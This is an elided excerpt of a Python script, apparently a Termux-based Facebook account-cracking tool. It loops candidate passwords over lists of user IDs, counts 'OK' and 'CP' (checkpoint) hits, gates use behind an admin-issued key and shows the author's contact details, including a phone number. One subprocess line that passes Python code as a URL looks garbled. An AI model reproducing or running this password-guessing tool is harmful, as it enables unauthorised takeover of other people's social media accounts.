...
def helpnote():
	...
	subprocess.check_output(["am", "start", "plr = requests.get('https://www.facebook.com/ab.rakib.54966').text"])
	exit(" [*] FACEBOOK :   RAKIB ")
...
def notice():
	...
	runtxt("\n\033[0;91mYOU ARE NOT Free USER ")
	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;92m RAKIB Cyber 07")
	subprocess.check_output(["am", "start", "https://m.me/ab.rakib.54966"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://www.facebook.com/ab.rakib.54966.txt').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mFree")
				FY = '\033[0;93m'
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : RAKIB
\033[1;91m [\033[1;94m✓\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : abrakib07 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01782727379
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RAKIB_OLD] : %s/%s -> \033[0;92m [ RAKIB-OK:%s ]- \033[0;91m[RAKIB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
